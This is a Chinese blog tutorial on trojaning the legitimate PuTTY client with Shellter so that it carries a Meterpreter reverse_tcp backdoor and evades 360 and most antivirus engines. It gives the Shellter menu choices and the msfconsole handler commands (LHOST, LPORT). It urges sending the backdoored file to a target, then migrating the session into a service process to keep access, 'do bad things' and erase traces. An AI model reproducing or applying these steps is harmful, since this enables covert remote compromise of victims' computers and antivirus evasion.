---
title: msf+shellter免杀360
date: 2016-08-07 13:27:54
tags: hack
---
## 简介
要绕过杀毒软件，达到免杀的效果，就要明白一个问题，杀毒软件的原理是什么？这个问题水很深，涉及很多知识，但是一个比较通俗的解释就是病毒特征码，很多病毒都拥有其特征码，一些知名病毒的特征码被记录在杀毒软件的病毒库中，如果杀毒软件的扫描器扫描你的软件，发现跟病毒库中的特征码有相同的，那么就判断你是病毒，除了特征码，就是杀毒软件扫描器的算法了，如何扫描你的软件也是很大的学问，自己能力有限，不知道理解是否正确，可以看看下面几篇博文来加深理解!

[“杀毒软件工作原理 及 现在主要杀毒技术”](http://blog.csdn.net/zhangnn5/article/details/6437371)

[“杀毒软件的杀毒原理”](http://www.doc88.com/p-3089076929073.html)

## 什么是shellter
shellter是一款动态Shellcode注入工具，也就是让你的攻击代码不具有规则性的注入到正常的可执行文件中，因为是**动态**的，说明代码注入不可能存在规则严格的地方，如可执行文件的入口点！！

比较蛋疼的是，最新的kali已经正式集成shellter，我做实验的时候还不知道，所以，用的是window版的shellter！！

## 先看看此前的ayu.exe
我们看看之前一篇博文生成的ayu.exe的免杀能力，我们用了x86/shikata_ga_nai这种编码方式，其实就是msfconsole的一种避开杀毒软件的方式，因为我们用的是个人版msfconsole，这种编码方式是开源的，所以杀毒软件公司也可以免费拿它的源码来分析，所以免杀效果不理想，可能是一种在优化这种编码的算法，所以还是有一定的免杀效果，如果你玩的是企业版msfconsole，免杀效果是很强的，问题是，你要有钱！

将ayu.exe上传到VirSCAN，这个网站集成了很多知名的杀毒软件引擎，用来判断你上传的文件是否可能是恶意软件
![在virscan上测试](http://obfs4iize.bkt.clouddn.com/%E5%9C%A8virscan%E4%B8%8A%E6%B5%8B%E8%AF%95.png)

virscan给出的结果是危险
![ayu是危险病毒](http://obfs4iize.bkt.clouddn.com/ayu%E6%98%AF%E5%8D%B1%E9%99%A9%E7%97%85%E6%AF%92.png)

但我发现，奇虎360竟然没有报毒，一脸懵逼。

![360没有报毒](http://obfs4iize.bkt.clouddn.com/360%E6%B2%A1%E6%9C%89%E6%8A%A5%E6%AF%92.png)

难道360这么菜了，我表示不信，于是我在本地用360杀毒来证实一下
![360试杀](http://obfs4iize.bkt.clouddn.com/360%E8%AF%95%E6%9D%80ayu.png)
![360报毒](http://obfs4iize.bkt.clouddn.com/360%E6%8A%A5%E6%AF%92.png)
结果，不出所料的报毒，想了想，可能是360安全卫士不会报毒，因为360安全卫士功能比较全面，杀毒方面可能比较弱，360杀毒来取代其杀毒方面！！

## 进行免杀
现在我们利用shellter来对木马进行免杀

我下载了[shellter](https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip)的windows程序

下载我们要注入的软件，我们这里选择putty.exe

什么是putty，其实putty就是一个用于ssh连接的普通软件
百度一下putty，就可以直接下载，当然putty这个软件是没毒的，接下来为其注入木马后门

首先，解压刚刚下载的shellter的压缩包，将putty.exe放入shellter的解压文件夹内
![将putty放入shellter文件夹中](http://obfs4iize.bkt.clouddn.com/%E5%B0%86putty%E6%94%BE%E5%85%A5shellter%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD.png)

双击shellter，运行它
第一项，要你选择操作模式，这里选a
第二项，要你选谁是否开启在线版本检查，这里选n
然后选择要注入的目标，这里为putty.exe
![开启shellter](http://obfs4iize.bkt.clouddn.com/%E5%BC%80%E5%90%AFshellter.png)

我们会发现注入语句一直在增加，一般需要几十秒钟就准备好了
![注入语句一直在增加](http://obfs4iize.bkt.clouddn.com/%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E4%B8%80%E7%9B%B4%E5%9C%A8%E5%A2%9E%E5%8A%A0.png)

然后会要你选择是否要使用隐身模式，这里选y
这里的隐身模式就是不会影响到软件的正常时候同时开启木马后门，让人进入你的电脑，也就是说，putty用于连接ssh的功能依旧可以用，只是被绑上了而外的木马功能！！

![选择mode](http://obfs4iize.bkt.clouddn.com/%E9%80%89%E6%8B%A9mode.png)

选择一个攻击载荷(payloads)，这里的攻击载荷在msfconsole中都可以找到

custom表示自定义要注入的代码，这个功能我也没用过

我们选择L，然后选择1，也就是配置比较简单了meterpreter_reverse_tcp这个攻击载荷

跟上篇博文一样，要为攻击载荷配置LHOST，也就是入侵者IP和LPORT入侵者端口

![设置一下](http://obfs4iize.bkt.clouddn.com/%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B.png)

然后我们等待一下，出现这么画面，那么就说明攻击载荷注入成功！
![注入成功](http://obfs4iize.bkt.clouddn.com/%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png)

此时我们得到一个新的putty.exe，虽然它的名字没有变，但是它已经携带木马了，接下来就各显神通的发送给你要渗透的人！！

进入kali，开启msfconsole

在命令终端输入如下命令：
```
	root@kali:~#msfconsole
	msf > use exploit/multi/handler
	msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
	这个攻击载荷就是刚刚我们在shellter携带的攻击载荷
	msf exploit(handler) > set LHOST 192.168.88.128
	msf exploit(handler) > set LPORT 2223
	msf exploit(handler) > exploit
	利用一下
```
![利用一下](http://obfs4iize.bkt.clouddn.com/%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%8B.png)

当带有木马的putty.exe被点击打开时，比如目标要使用putty的ssh，打开了putty。

![putty程序开启](http://obfs4iize.bkt.clouddn.com/putty%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%90%AF.png)

那么我们就可以获得远程控制会话！！
![利用成功_1](http://obfs4iize.bkt.clouddn.com/%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F_1.png)

此时我们再用virscan来扫描一下，看看有多少个杀毒引擎会报毒
![putty要警惕](http://obfs4iize.bkt.clouddn.com/putty%E8%A6%81%E8%AD%A6%E6%83%95.png)
发现只有三个杀毒引擎报毒
![只有3个报毒](http://obfs4iize.bkt.clouddn.com/%E5%8F%AA%E6%9C%893%E4%B8%AA%E6%8A%A5%E6%AF%92.png)

木马的隐藏性大大增强了，国内的主流杀毒软件都被绕过，我们再在本地用360杀毒软件扫描一下
![绕过360_1](http://obfs4iize.bkt.clouddn.com/%E7%BB%95%E8%BF%87360_1.png)

因为我们的木马进程是寄托在putty这个进程下的，如果putty一关闭，我们就失去了这个会话了，所有我们要做的第一件事是将它转移到不会在短时间内关闭的进程中!
![移动进程](http://obfs4iize.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E8%BF%9B%E7%A8%8B.png)

这里我把它移动到进程号为516的一个服务中，确保我有足够的时间做坏事和擦除自己留下的痕迹！！

其实kali中也一样可以运行shellter，需要wine的支持

```
 root@kali：~# apt-get update
 更新一下apt-get软件管理仓库
 root@kali：~# apt-get install shellter
 安装shellter，之前最好装了wine
```
![在kali上安装shellter](http://obfs4iize.bkt.clouddn.com/%E5%9C%A8kali%E4%B8%8A%E5%AE%89%E8%A3%85shellter.png)
安装完后，直接在命令中输入shellter

可以看看这个[视频](https://www.nettitude.co.uk/wp-content/uploads/2015/06/Installing-Using-Shellter-v3.1-in-Kali-Linux1.mp4)，手把手教你shellter+msfconsole一条龙

**用代码创造乐趣---ayu**

[msfconsole命令大全](https://www.91ri.org/8476.html)